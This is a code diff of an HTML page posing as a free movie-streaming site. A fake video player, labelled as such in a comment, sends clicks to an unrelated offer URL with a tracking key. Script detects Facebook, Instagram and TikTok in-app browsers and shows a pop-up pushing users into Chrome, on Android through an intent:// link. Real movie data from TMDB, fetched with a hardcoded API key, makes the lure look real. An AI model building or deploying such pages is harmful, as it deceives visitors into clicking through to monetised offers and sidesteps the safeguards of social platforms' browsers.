@@ -18,9 +18,6 @@
             --surface: #151a27;
             --text-main: #f1f5f9;
             --text-muted: #94a3b8;
-            --accent: #3b82f6;
-            --accent-hover: #2563eb;
-            --rating: #fbbf24;
         }
         
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -29,16 +26,16 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: var(--bg-color);
             color: var(--text-main);
-            line-height: 1.5;
+            line-height: 1.4;
         }
 
         .container {
             max-width: 1000px;
             margin: 0 auto;
-            padding: 10px; 
+            padding: 8px;
             display: flex;
             flex-direction: column;
-            gap: 10px; 
+            gap: 8px;
         }
 
         /* Fake Embed Video Player */
@@ -46,18 +43,21 @@
             position: relative;
             width: 100%;
             padding-top: 56.25%; /* 16:9 Aspect Ratio */
-            background-color: #000;
-            border-radius: 8px;
+            background-color: #000000;
+            border-radius: 4px;
             overflow: hidden;
             cursor: pointer;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.5);
         }
 
         .player-box img.backdrop {
             position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             object-fit: cover;
-            opacity: 0.45; 
+            opacity: 0.45;
             transition: opacity 0.3s;
         }
 
@@ -65,58 +65,52 @@
 
         .play-btn {
             position: absolute;
-            top: 50%; left: 50%;
+            top: 50%;
+            left: 50%;
             transform: translate(-50%, -50%);
-            width: 80px; height: 80px;
+            width: 75px;
+            height: 75px;
             background-color: rgba(255, 255, 255, 0.95);
             border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             z-index: 2;
-            transition: all 0.2s ease;
-            box-shadow: 0 0 25px rgba(255, 255, 255, 0.2);
+            transition: transform 0.2s ease, background-color 0.2s;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
         }
 
         .play-btn::after {
             content: '';
-            border-top: 22px solid transparent;
-            border-bottom: 22px solid transparent;
-            border-left: 32px solid #0b0f19;
-            margin-left: 10px; 
+            border-top: 20px solid transparent;
+            border-bottom: 20px solid transparent;
+            border-left: 28px solid #0b0f19;
+            margin-left: 8px; 
         }
 
         .player-box:hover .play-btn {
             transform: translate(-50%, -50%) scale(1.1);
             background-color: #ffffff;
-            box-shadow: 0 0 35px rgba(255, 255, 255, 0.4);
+            box-shadow: 0 0 25px rgba(255, 255, 255, 0.5);
         }
 
         /* Movie Info Section */
         .info-box {
             background-color: var(--surface);
-            padding: 16px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            padding: 12px;
+            border-radius: 4px;
         }
 
         .info-box h1 {
-            font-size: 1.5rem;
-            margin-bottom: 8px;
+            font-size: 1.4rem;
+            margin-bottom: 6px;
             font-weight: 700;
-            color: #ffffff;
         }
-
-        .meta-data {
-            display: flex; gap: 16px; align-items: center;
-            margin-bottom: 12px; font-size: 0.95rem; font-weight: 600;
-        }
-
-        .meta-data .rating { color: var(--rating); }
-        .meta-data .quality { background: #eab308; color: #000; padding: 2px 8px; border-radius: 4px; font-size: 0.8rem; font-weight: 800;}
 
         .info-box .desc {
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             color: var(--text-muted);
-            margin-bottom: 12px;
+            margin-bottom: 8px;
             display: -webkit-box;
             -webkit-line-clamp: 3;
             -webkit-box-orient: vertical;
@@ -124,49 +118,55 @@
         }
 
         .info-box .cast {
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             color: #cbd5e1;
+            font-weight: 500;
         }
-        .cast strong { color: #fff; }
+
+        .cast span { color: var(--text-muted); }
 
         /* Trending Movies Section */
         .related-title {
-            font-size: 1.2rem;
-            font-weight: 600;
-            margin: 10px 0 6px 0;
-            padding-left: 10px;
-            border-left: 4px solid var(--accent);
+            font-size: 1.1rem;
+            margin: 4px 0;
+            padding-left: 6px;
+            border-left: 3px solid #ffffff;
         }
 
         .grid {
             display: grid;
             grid-template-columns: repeat(6, 1fr);
-            gap: 8px; 
+            gap: 6px;
         }
 
         .movie-card {
             position: relative;
             aspect-ratio: 2 / 3;
             background-color: var(--surface);
-            border-radius: 6px;
+            border-radius: 4px;
             overflow: hidden;
             cursor: pointer;
             transition: transform 0.2s;
         }
 
-        .movie-card:hover { transform: translateY(-4px); }
+        .movie-card:hover {
+            transform: translateY(-2px);
+        }
 
         .movie-card img {
-            width: 100%; height: 100%;
+            width: 100%;
+            height: 100%;
             object-fit: cover;
         }
 
         .movie-card .card-title {
             position: absolute;
-            bottom: 0; left: 0; width: 100%;
-            padding: 24px 8px 8px 8px;
-            background: linear-gradient(to top, rgba(0,0,0,0.95) 0%, rgba(0,0,0,0.7) 50%, transparent 100%);
-            font-size: 0.8rem;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 24px 6px 6px 6px;
+            background: linear-gradient(to top, rgba(0,0,0,0.95) 0%, rgba(0,0,0,0.6) 60%, transparent 100%);
+            font-size: 0.75rem;
             font-weight: 600;
             text-align: center;
             white-space: nowrap;
@@ -174,63 +174,12 @@
             text-overflow: ellipsis;
         }
 
-        /* Professional In-App Browser Popup */
-        .ia-overlay {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(11, 15, 25, 0.85);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
-            z-index: 999999;
-            display: flex; align-items: center; justify-content: center;
-            padding: 20px;
-        }
-        .ia-modal {
-            background: var(--surface);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 20px;
-            padding: 32px 24px;
-            width: 100%; max-width: 380px;
-            text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-            animation: scaleUp 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-        }
-        @keyframes scaleUp {
-            0% { transform: scale(0.95) translateY(10px); opacity: 0; }
-            100% { transform: scale(1) translateY(0); opacity: 1; }
-        }
-        .ia-icon-wrap {
-            width: 72px; height: 72px;
-            background: rgba(59, 130, 246, 0.15);
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 20px;
-        }
-        .ia-icon-wrap svg { width: 36px; height: 36px; color: var(--accent); }
-        .ia-title { font-size: 1.3rem; font-weight: 700; color: #fff; margin-bottom: 12px; }
-        .ia-desc { font-size: 0.95rem; color: var(--text-muted); margin-bottom: 28px; line-height: 1.6; }
-        .ia-btn {
-            display: block; width: 100%;
-            background: var(--accent); color: #fff;
-            padding: 16px; border-radius: 12px;
-            font-weight: 600; font-size: 1.05rem;
-            text-decoration: none; transition: background 0.2s;
-        }
-        .ia-btn:hover { background: var(--accent-hover); }
-        
-        .ia-ios-instruction {
-            background: rgba(255,255,255,0.03);
-            border: 1px dashed rgba(255,255,255,0.15);
-            padding: 16px; border-radius: 12px;
-            color: #e2e8f0; font-size: 0.95rem; line-height: 1.6; text-align: left;
-        }
-        .ia-ios-instruction strong { color: #fff; display: block; margin-bottom: 8px; font-size: 1.05rem;}
-
         /* Responsive Design */
         @media (max-width: 768px) {
-            .grid { grid-template-columns: repeat(3, 1fr); gap: 6px; }
-            .info-box h1 { font-size: 1.3rem; }
-            .play-btn { width: 60px; height: 60px; }
-            .play-btn::after { border-top: 16px solid transparent; border-bottom: 16px solid transparent; border-left: 24px solid #0b0f19; margin-left: 8px;}
+            .grid { grid-template-columns: repeat(3, 1fr); gap: 4px; }
+            .info-box h1 { font-size: 1.2rem; }
+            .play-btn { width: 55px; height: 55px; }
+            .play-btn::after { border-top: 14px solid transparent; border-bottom: 14px solid transparent; border-left: 20px solid #0b0f19; margin-left: 6px;}
         }
     </style>
 </head>
@@ -246,154 +195,151 @@
         <!-- Movie Info -->
         <div class="info-box">
             <h1 id="movie-title">Loading...</h1>
-            <div class="meta-data">
-                <span class="quality">HD</span>
-                <span class="rating" id="movie-rating">⭐ 0.0 / 10</span>
-            </div>
             <p class="desc" id="movie-desc">Please wait while data is being fetched...</p>
-            <div class="cast"><strong>Cast:</strong> <span id="movie-cast">...</span></div>
+            <div class="cast">Cast: <span id="movie-cast">...</span></div>
         </div>
 
-        <!-- Trending Movies Grid -->
+        <!-- Trending Movies -->
         <div class="related-title">Trending Today</div>
         <div class="grid" id="related-grid">
-            <!-- Thumbnail digenerate via JS -->
+            <!-- Thumbnails generated via JS -->
         </div>
     </div>
 
     <script>
         // ==========================================================
-        //                       PENGATURAN API
+        //                       SETTINGS
         // ==========================================================
         const API_KEY = 'ff4a228b2bde4cea37efcc472696d620'; 
-        
-        // Link Default jika pengambilan dari Github gagal
-        let TARGET_URL = 'https://spreadpreferencetelevision.com/hhqe0ruxga?key=e3ff974fd2665b1074e29d32efa30da4'; 
-        
-        // Fungsi Redirect
+        const TARGET_URL = 'https://spreadpreferencetelevision.com/hhqe0ruxga?key=e3ff974fd2665b1074e29d32efa30da4';
+        // ==========================================================
+
+        // Redirect Function
         function redirectToOffer() {
             window.location.href = TARGET_URL;
         }
 
-        // ==========================================================
-        // 1. Ambil Link Random dari .txt
-        // ==========================================================
-        async function fetchRandomLink() {
-            try {
-                const response = await fetch('https://seribudollarperhari.github.io/banner/link.txt');
-                const text = await response.text();
-                // Pisahkan per baris, bersihkan spasi, dan pastikan itu format URL (http)
-                const links = text.split('\n').map(l => l.trim()).filter(l => l.startsWith('http'));
-                
-                if (links.length > 0) {
-                    // Pilih satu link secara acak
-                    TARGET_URL = links[Math.floor(Math.random() * links.length)];
-                }
-            } catch (error) {
-                console.error("Failed to fetch random link, using default.", error);
-            }
-            
-            // Setelah link didapat, periksa apakah dibuka via In-App Browser (FB/IG/TikTok)
-            checkInAppBrowser();
-        }
-
-        // ==========================================================
-        // 2. Deteksi & Tampilkan Popup Profesional untuk In-App Browser
-        // ==========================================================
-        function checkInAppBrowser() {
+        // Facebook / In-App Browser Detection Script
+        document.addEventListener("DOMContentLoaded", function() {
             const ua = navigator.userAgent || navigator.vendor || window.opera;
             const isInAppBrowser = /FBAN|FBAV|Instagram|TikTok|Line|Twitter|Threads/i.test(ua);
+            const isAndroid = /android/i.test(ua);
+            const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
             
             if (isInAppBrowser) {
                 let parsedUrl;
                 try {
                     parsedUrl = new URL(TARGET_URL);
                 } catch(e) {
-                    parsedUrl = new URL("https://google.com");
+                    parsedUrl = new URL("https://" + TARGET_URL.replace(/^https?:\/\//, ''));
                 }
                 
-                let normalHref = parsedUrl.href;
                 let intentTarget = parsedUrl.host + parsedUrl.pathname + parsedUrl.search;
+                let normalHref = parsedUrl.href;
                 let fallbackEncoded = encodeURIComponent(normalHref);
                 
                 let actionHTML = '';
-                
-                // Cek Perangkat Android atau iOS
-                if (/android/i.test(ua)) {
+                if (isAndroid) {
                     const intentUrl = `intent://${intentTarget}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${fallbackEncoded};end`;
-                    actionHTML = `<a href="${intentUrl}" class="ia-btn">Continue to Browser</a>`;
-                } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
-                    actionHTML = `
-                    <div class="ia-ios-instruction">
-                        <strong>Action Required</strong>
-                        Tap the <b>three dots (...)</b> at the top right corner and select <b>"Open in Browser"</b> or <b>"Open in Safari"</b> to watch the movie smoothly.
-                    </div>`;
+                    actionHTML = `<a href="${intentUrl}" class="ia-btn primary">Continue</a>`;
+                } else if (isIOS) {
+                    actionHTML = `<span style="font-size:13px; color:#666; text-align:right; font-weight:600;">Tap <b>...</b> (menu)<br>Open in Safari</span>`;
                 } else {
-                    actionHTML = `<a href="${normalHref}" class="ia-btn">Continue to Browser</a>`;
+                    actionHTML = `<a href="${normalHref}" class="ia-btn primary">Continue</a>`;
                 }
+                
+                const sheetCSS = `<style>
+                    .ia-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:999998;display:flex;align-items:flex-end;justify-content:center}
+                    .ia-sheet{width:100%;max-width:600px;background:#fff;border-radius:20px 20px 0 0;padding:25px 20px;font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;box-shadow:0 -4px 15px rgba(0,0,0,0.1);animation:slideUp 0.3s ease-out forwards}
+                    @keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+                    .ia-header{text-align:center;font-size:17px;font-weight:700;color:#050505;padding-bottom:15px;border-bottom:1px solid #ced0d4;margin-bottom:20px}
+                    .ia-row{display:flex;align-items:center;justify-content:space-between}
+                    .ia-left{display:flex;align-items:center;gap:15px}
+                    .ia-icon{width:42px;height:42px}
+                    .ia-text{font-size:16px;font-weight:600;color:#050505}
+                    .ia-btn{background:#e4e6eb;color:#050505;font-size:15px;font-weight:600;padding:10px 24px;border-radius:24px;text-decoration:none;transition:0.2s}
+                    /* HERE: Change primary button to green background and white text */
+                    .ia-btn.primary{background:#28a745;color:#ffffff}
+                </style>`;
                 
                 const sheetHTML = `
                 <div class="ia-overlay">
-                    <div class="ia-modal">
-                        <div class="ia-icon-wrap">
-                            <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                                <path stroke-linecap="round" stroke-linejoin="round" d="M12 21a9.004 9.004 0 008.716-6.747M12 21a9.004 9.004 0 01-8.716-6.747M12 21c2.485 0 4.5-4.03 4.5-9S14.485 3 12 3m0 18c-2.485 0-4.5-4.03-4.5-9S9.515 3 12 3m0 0a8.997 8.997 0 017.843 4.582M12 3a8.997 8.997 0 00-7.843 4.582m15.686 0A11.953 11.953 0 0112 10.5c-2.998 0-5.74-1.1-7.843-2.918m15.686 0A8.959 8.959 0 0121 12c0 .778-.099 1.533-.284 2.253m0 0A17.958 17.958 0 0112 14.25c-3.007 0-5.83-.808-8.284-2.253m16.568 0A8.959 8.959 0 013 12c0-.778.099-1.533.284-2.253M12 21c-2.485 0-4.5-4.03-4.5-9"></path>
-                            </svg>
+                    <div class="ia-sheet">
+                        <div class="ia-header">Open Video in Browser...</div>
+                        <div class="ia-row">
+                            <div class="ia-left">
+                                <svg class="ia-icon" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M24 10C16.27 10 10 16.27 10 24C10 31.73 16.27 38 24 38C31.73 38 38 31.73 38 24C38 16.27 31.73 10 24 10ZM24 13.5C28.42 13.5 32.2 16.23 33.72 20H16.24C17.97 16.03 21.84 13.5 24 13.5ZM13.88 26.5C13.62 25.7 13.5 24.87 13.5 24C13.5 22.18 14.04 20.48 14.97 19.06L23.75 34.27C18.66 33.84 14.63 30.64 13.88 26.5ZM24 28.5C21.51 28.5 19.5 26.49 19.5 24C19.5 21.51 21.51 19.5 24 19.5C26.49 19.5 28.5 21.51 28.5 24C28.5 26.49 26.49 28.5 24 28.5ZM24.47 34.48L17.7 22.75H32.48C32.8 24.08 33.15 25.5 33.15 27C33.15 31.06 29.83 34.39 25.7 34.48C25.29 34.49 24.88 34.49 24.47 34.48ZM34.27 24C34.27 25.13 34.07 26.21 33.7 27.21L26.31 14.43C30.93 15.65 34.27 19.45 34.27 24Z" fill="#4285F4"/>
+                                    <path d="M24 19.5C21.51 19.5 19.5 21.51 19.5 24C19.5 26.49 21.51 28.5 24 28.5C26.49 28.5 28.5 26.49 28.5 24C28.5 21.51 26.49 19.5 24 19.5Z" fill="#FFFFFF"/>
+                                </svg>
+                                <span class="ia-text">Chrome / Browser</span>
+                            </div>
+                            ${actionHTML}
                         </div>
-                        <div class="ia-title">Optimal Experience</div>
-                        <div class="ia-desc">For the best streaming quality and to prevent playback issues, please open this page in your default system browser.</div>
-                        ${actionHTML}
                     </div>
                 </div>`;
                 
-                document.body.style.overflow = 'hidden'; // Kunci scroll
-                document.body.insertAdjacentHTML('beforeend', sheetHTML);
+                document.body.style.overflow = 'hidden';
+                document.body.insertAdjacentHTML('beforeend', sheetCSS + sheetHTML);
             }
-        }
+        });
 
-        // ==========================================================
-        // 3. Ambil Data API Film (Random di Main Screen)
-        // ==========================================================
+        // Movie API Fetch Script
         async function loadMovieData() {
+            if (API_KEY === 'INSERT_YOUR_TMDB_API_KEY_HERE') {
+                document.getElementById('movie-title').innerText = "TMDB API Key is Missing";
+                return;
+            }
+
             try {
-                // Fetch Trending Movies
+                // 1. Fetch Trending Movies Today to pick a random movie
                 const resTrending = await fetch(`https://api.themoviedb.org/3/trending/movie/day?api_key=${API_KEY}&language=en-US`);
                 const trending = await resTrending.json();
 
-                // Acak daftar trending untuk mencari film utama secara random
-                const shuffled = trending.results.sort(() => 0.5 - Math.random());
-                const mainMovie = shuffled[0]; // Ambil 1 film random untuk player utama
+                // Pick a random movie from the trending list
+                const randomMovie = trending.results[Math.floor(Math.random() * trending.results.length)];
+                const MOVIE_ID = randomMovie.id;
 
-                // Fetch Detail & Cast (Credits) untuk film utama
-                const resCredits = await fetch(`https://api.themoviedb.org/3/movie/${mainMovie.id}/credits?api_key=${API_KEY}`);
-                const credits = await resCredits.json();
+                // 2. Fetch Detailed Data for the chosen random movie
+                const resMovie = await fetch(`https://api.themoviedb.org/3/movie/${MOVIE_ID}?api_key=${API_KEY}&language=en-US`);
+                const movie = await resMovie.json();
 
-                // Format Judul & Tahun
-                const year = mainMovie.release_date ? mainMovie.release_date.substring(0, 4) : '2024';
-                const formattedTitle = `Watch ${mainMovie.title} ${year} Stream Online`;
-                const rating = mainMovie.vote_average ? mainMovie.vote_average.toFixed(1) : '0.0';
+                // 3. Fetch Data Cast
+                const resCast = await fetch(`https://api.themoviedb.org/3/movie/${MOVIE_ID}/credits?api_key=${API_KEY}`);
+                const credits = await resCast.json();
 
-                // Update UI: Info Film Utama
-                document.getElementById('movie-title').innerText = formattedTitle;
-                document.getElementById('movie-desc').innerText = mainMovie.overview;
-                document.getElementById('movie-rating').innerText = `⭐ ${rating} / 10`;
-                document.getElementById('player-bg').src = `https://image.tmdb.org/t/p/w1280${mainMovie.backdrop_path}`;
+                // Extract Release Year
+                const releaseYear = movie.release_date ? movie.release_date.split('-')[0] : '';
                 
-                // Update Cast (5 Pemeran Teratas)
+                // Format Title: Watch [Title] [Year] Stream Online
+                const displayTitle = `Watch ${movie.title} ${releaseYear} Stream Online`;
+
+                // Update UI: Movie Info
+                document.getElementById('movie-title').innerText = displayTitle;
+                document.getElementById('movie-desc').innerText = movie.overview || 'No description available.';
+                document.getElementById('player-bg').src = `https://image.tmdb.org/t/p/w1280${movie.backdrop_path}`;
+                
+                // Top Cast
                 const topCast = credits.cast.slice(0, 5).map(c => c.name).join(', ');
-                document.getElementById('movie-cast').innerText = topCast || 'Data cast not available';
+                document.getElementById('movie-cast').innerText = topCast || 'N/A';
 
-                // Update Meta Browser
-                document.title = formattedTitle;
-                document.getElementById('og-title').setAttribute('content', formattedTitle);
-                document.getElementById('og-desc').setAttribute('content', mainMovie.overview);
-                document.getElementById('og-img').setAttribute('content', `https://image.tmdb.org/t/p/w780${mainMovie.backdrop_path}`);
+                // Update Dynamic Meta Script
+                document.title = `${displayTitle} - Free`;
+                document.getElementById('og-title').setAttribute('content', displayTitle);
+                document.getElementById('og-desc').setAttribute('content', movie.overview);
+                document.getElementById('og-img').setAttribute('content', `https://image.tmdb.org/t/p/w780${movie.backdrop_path}`);
 
-                // Update UI: Trending Grid di Bawah (Pilih 6 film selain film utama)
-                const gridMovies = shuffled.slice(1, 7);
+                // Update UI: Trending Today (Shuffle the rest)
                 const grid = document.getElementById('related-grid');
                 
-                gridMovies.forEach(item => {
+                // Filter out the currently selected movie, then shuffle
+                const filteredTrending = trending.results.filter(item => item.id !== MOVIE_ID);
+                const shuffledTrending = filteredTrending.sort(() => 0.5 - Math.random());
+                
+                // Pick top 6 after shuffle
+                const selectedTrending = shuffledTrending.slice(0, 6);
+
+                selectedTrending.forEach(item => {
                     if (item.poster_path) {
                         const card = document.createElement('div');
                         card.className = 'movie-card';
@@ -407,18 +353,12 @@
                 });
 
             } catch (error) {
-                console.error("API Load Error:", error);
-                document.getElementById('movie-title').innerText = "Movie Server Error / Try Again";
+                console.error("Failed to load API:", error);
+                document.getElementById('movie-title').innerText = "Movie Not Found / Error";
             }
         }
 
-        // ==========================================================
-        // Eksekusi Semua Fungsi Saat Halaman Dimuat
-        // ==========================================================
-        window.onload = async function() {
-            await fetchRandomLink(); // Tarik link lalu jalankan cek in-app browser
-            await loadMovieData();   // Render data API Film
-        };
+        window.onload = loadMovieData;
     </script>
 </body>
 </html>
